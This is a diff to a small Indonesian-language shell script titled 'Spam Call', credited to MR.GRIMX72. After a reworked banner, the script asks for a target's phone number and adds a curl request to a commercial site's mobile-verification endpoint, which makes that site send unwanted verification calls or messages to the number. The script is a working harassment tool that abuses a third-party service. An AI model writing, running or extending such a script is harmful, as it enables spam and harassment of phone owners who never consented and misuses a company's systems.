@@ -4,16 +4,23 @@ red="\033[1;31m"
 blu="\033[1;96m"
 
 sleep 1
-toilet -f -big -F gay SPAM CALL
-echo "${red}══════════════"
-echo "${blu} Author    : MR.GRIMX72"
-echo "${blu} Youtube : Belum Ada"
-echo "${blu} Version  : Spam Version 1"
-echo "${red}══════════════\n${blu}"
+echo "${blu} [!] Loading . . ."
+sleep 1
+echo "${blu} Orang sabar di sayang tuhan:)"
+sleep 3
+clear
+
+figlet Spam Call | lolcat
+echo "${red}════════════════════════════"
+echo "${blu} Author  : MR.GRIMX72"
+echo "${blu} Youtube: Belum Ada"
+echo "${blu} Version : Spam Version 1"
+echo "${red}════════════════════════════\n${blu}"
 sleep 1
 read -p "[+] Masukan No Target : " nomor
 link="https://id.jagreward.com/member/verify-mobile/$nomor"
-echo "${red} [×] Limit bro"
+echo "${red}[×] Limit bro"
+curl -s $link
 sleep 1
 echo
 figlet Selesai | lolcat
